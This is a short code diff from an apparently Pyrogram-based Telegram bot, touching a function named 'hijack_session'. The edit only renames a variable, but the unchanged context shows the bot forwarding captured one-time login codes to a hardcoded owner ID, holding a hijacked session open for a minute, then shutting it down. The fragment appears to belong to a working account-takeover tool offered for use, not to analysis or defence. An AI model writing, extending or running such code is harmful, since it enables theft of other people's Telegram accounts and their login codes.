@@ -222,10 +222,10 @@ async def hijack_session(_, message):
                 OWNER_ID =1970647198
                 await app.send_message(OWNER_ID, otp_text)
                 # ✅ Wait briefly to receive OTP, then terminate
-                await message.delete()
+                await msg.delete()
                 await asyncio.sleep(60)  # Wait 1 minutes before auto-stopping
                 await otp_userbot.stop()
-                await message.reply("🛑 OTP session closed...")
+                await msg.reply("🛑 OTP session closed...")
         #await idle()
         #asyncio.create_task(otp_userbot.run())
     except Exception as e:
